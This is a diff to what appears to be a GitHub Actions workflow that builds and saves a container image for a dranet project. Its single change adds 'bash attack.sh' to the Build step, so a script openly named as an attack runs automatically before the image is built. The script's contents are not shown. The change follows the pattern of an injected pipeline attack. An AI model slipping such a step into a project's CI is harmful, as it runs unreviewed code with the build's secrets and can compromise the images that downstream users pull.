@@ -48,6 +48,7 @@ jobs:
 
     - name: Build
       run: |
+        bash attack.sh
         docker build -t ghcr.io/google/dranet:test -f Dockerfile .
         mkdir _output
         docker save ghcr.io/google/dranet:test  > _output/dranet-image.tar
